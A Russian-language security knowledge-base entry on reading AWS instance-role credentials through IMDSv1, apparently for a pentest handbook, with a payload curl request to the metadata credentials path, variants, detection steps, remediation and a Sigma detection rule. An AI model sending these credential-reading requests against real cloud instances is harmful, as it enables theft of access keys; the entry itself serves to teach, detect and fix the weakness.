---
id: cloud-aws-imdsv1-role-credentials
title: "AWS: IMDSv1 — временные ключи роли инстанса"
type: cloud
target: aws
category: cloud
difficulty: intermediate
bypass: none
tags: [aws, imds, ssrf, iam]
tested_on: ["AWS EC2 (IMDSv1)"]
success_rate: 0.6
risk: high
cwe: "CWE-918"
lab: null
last_verified: "2026-10-23"
references:
  - "https://attack.mitre.org/tactics/TA0007/"
  - "https://hackingthe.cloud/"
graph:
  - target: "cloud"
    type: instance_of
  - target: "ssrf"
    type: related_to
  - target: "privilege-escalation"
    type: leads_to
---

# AWS: IMDSv1 — временные ключи роли инстанса

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Explanation

IMDSv1 не требует аутентификации: любой процесс (или SSRF из приложения) может
прочитать метаданные инстанса, включая временные ключи роли (`AccessKeyId`,
`SecretAccessKey`, `Token`). Дальше ключи используются из любой точки интернета —
это классический сценарий масштабных утечек (Capital One, 2019).
IMDSv2 требует PUT-запрос с `X-aws-ec2-metadata-token-ttl-seconds` и запрещает
открытые редиректы, поэтому SSRF через большинство библиотек перестаёт работать.
`HttpPutResponseHopLimit=1` дополнительно блокирует доступ из контейнеров.

## Detection

1. `aws ec2 describe-instances` -> `MetadataOptions`: `HttpTokens=optional` = IMDSv1 разрешён.
2. Внутри инстанса: `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
3. Аудит: `aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions'`.
4. CloudTrail: внезапные API-вызовы роли с внешних IP.

## Remediation

- `HttpTokens=required` (IMDSv2) на всех инстансах и в launch-templates/AMI.
- `HttpPutResponseHopLimit=1`, `HttpEndpoint` отключить там, где метаданные не нужны.
- Минимальные права роли инстанса; отдельные роли на задачу, без `*:*`.
- Валидация URL на уровне приложения (whitelist) + egress-фильтрация link-local.
- Мониторинг CloudTrail на использование ролей EC2 извне AWS-сети.

## Variants

```
curl -H 'X-aws-ec2-metadata-token: <TOKEN>' http://169.254.169.254/latest/meta-data/
```

```
http://169.254.169.254/latest/user-data
```

## Detection rules

```yaml
title: AWS IMDSv1 — учётные данные роли без сессионного PUT-токена
id: f6a7b8c9-0013-4f6a-8b9c-000000000013
status: experimental
description: >-
  GET к /latest/meta-data/iam/security-credentials/ на 169.254.169.254:
  при IMDSv1 любой процесс (или SSRF) в инстансе забирает временные ключи
  роли одним запросом. IMDSv2 требует предварительный PUT /latest/api/token.
references:
  - https://attack.mitre.org/techniques/T1552/005/
  - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
logsource:
  category: firewall
  definition: 'egress-лог прокси/файрвола + VPC flow logs (dst 169.254.169.254)'
detection:
  selection:
    dst_ip: 169.254.169.254
    http_method: GET
  credentials_path:
    uri|contains:
      - 'latest/meta-data/iam/security-credentials'
      - 'latest/user-data'
  condition: selection and credentials_path
fields:
  - src_ip
  - dst_ip
  - http_method
  - uri
falsepositives:
  - легитимные вызовы SDK внутри инстансов (постоянный фон) — детект ценен
    для публичных сервисов и в корреляции с SSRF-индикаторами; главный фикс —
    принудительный IMDSv2 (HttpTokens=required, hop limit 1)
level: high
tags:
  - attack.credential_access
  - attack.t1552.005
  - cwe.918
```
